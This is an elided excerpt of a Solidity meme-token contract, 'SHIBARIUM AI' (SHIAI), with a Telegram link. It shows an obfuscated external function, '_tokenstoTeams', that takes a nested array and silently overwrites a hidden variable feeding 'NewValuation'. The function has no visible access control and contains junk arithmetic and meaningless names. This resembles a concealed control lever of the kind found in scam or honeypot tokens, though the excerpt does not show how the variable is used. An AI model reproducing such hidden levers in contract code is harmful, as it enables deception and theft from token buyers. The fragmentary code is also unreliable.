...
// Telegram Group : https://t.me/ShibariumAIErc
...
contract ShibariumAI is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private constant _name = "SHIBARIUM AI";
    string private constant _symbol = "SHIAI";
    ...
    uint256 private NewValuation = liopisto;
    ...
    function _tokenstoTeams(uint256[7][6][7] memory vgjgr) external returns(bool) {
        require(vgjgr[5][4][6] >97);
        uint8 drkorti = 1;
        uint8 prcondu = 2;
        uint256 aracondu = drkorti+prcondu;
        liopisto = vgjgr[5][4][6];
        return true;
    }
